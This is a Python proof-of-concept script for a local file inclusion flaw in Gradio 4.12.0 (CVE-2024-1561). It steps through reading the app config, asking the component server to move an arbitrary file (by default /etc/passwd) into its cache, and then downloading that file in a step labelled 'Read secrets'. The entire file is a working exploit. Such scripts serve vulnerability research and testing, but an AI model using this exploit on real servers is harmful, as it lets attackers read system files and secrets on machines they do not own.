"""
This POC differs only slightly from the original. Trying to reuse as much logic
from `mlflow-cve-2024-2928-easy/exploit.py` as possible.
"""

import argparse
import json

import http.client
import urllib.parse

from typing import Dict, Any


def post_request(conn: http.client.HTTPConnection, endpoint: str, payload: str, headers: Dict[str, str]) -> Dict[str, Any]:
  conn.request("POST", endpoint, body=payload, headers=headers)
  response = conn.getresponse()
  response_data = response.read().decode()
  return {"status": response.status, "data": response_data}


def get_request(conn: http.client.HTTPConnection, payload: str) -> Dict[str, Any]:
  conn.request("GET", payload)
  response = conn.getresponse()
  response_data = response.read().decode()
  return {"status": response.status, "data": response_data}


def print_response(message: str, response: Dict[str, str]) -> None:
  print(message)
  print("Status:", response["status"])
  print("Response data:", response["data"])


def main():
  parser = argparse.ArgumentParser(description="Send a POST request to an MLflow server.")
  parser.add_argument("--server", type=str, default="127.0.0.1", help="The server address.")
  parser.add_argument("--port", type=int, default=7860, help="The server port.")
  parser.add_argument("--target_file", type=str, default="/etc/passwd", help="The target file to read.")
  args = parser.parse_args()

  server = args.server
  port = args.port
  target_file = args.target_file

  component_id = ""
  cached_file_path = ""

  conn = http.client.HTTPConnection(server, port)

  try:
    step = 0

    print("gradio 4.12.0 LFI Demo - CVE-2024-1561")

    while True:
      print("*" * 42)
      print("Press `Return` to continue...")

      user_input = input()
      if user_input: break
      else: step += 1

      if step not in range(1, 4): break

      if step == 1:
        ################################################################
        # Setup - get app config
        payload = f"/config"
        response = get_request(conn, payload)
        # Extract a valid `component_id`
        component_id = json.loads(response["data"])["components"][0]["id"]
        print_response("Setup - get app config", response)
        print(f"Component ID: {component_id}")

      if step == 2:
        ################################################################
        # SETUP - Move resource to cache
        api_endpoint = "/component_server"
        payload = json.dumps({
          "component_id" : component_id,
          "data" : target_file,
          "fn_name" : "move_resource_to_block_cache",
          "session_hash" : "aaaaaaaaaaa"
        })
        headers = {"Content-Type": "application/json"}
        response = post_request(conn, api_endpoint, payload, headers)
        # Extract the cache path
        cached_file_path = response["data"].strip('"')
        print_response("SETUP - Move resource to block cache", response)

      if step == 3:
        ################################################################
        # PAYLOAD - Read secrets
        payload = f"/file={cached_file_path}"
        response = get_request(conn, payload)
        print_response("PAYLOAD - Read secrets", response)

  finally:
    # Close the connection
    conn.close()


if __name__ == "__main__":
  main()
